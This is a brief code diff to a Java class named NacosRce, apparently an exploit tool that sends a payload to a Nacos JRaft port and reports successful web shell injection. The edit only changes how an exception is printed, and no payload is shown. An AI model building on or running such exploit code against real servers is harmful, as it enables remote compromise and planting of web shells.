@@ -75,7 +75,7 @@ public class NacosRce {
             try {
                 sendPayload(jraftAddr,baos0.toByteArray());
             }catch (Exception e){
-                System.err.println(e);
+                e.printStackTrace();
             }
             if(c.isWebShell()){
                 System.err.println("*****自动注入结束，注入成功*****");
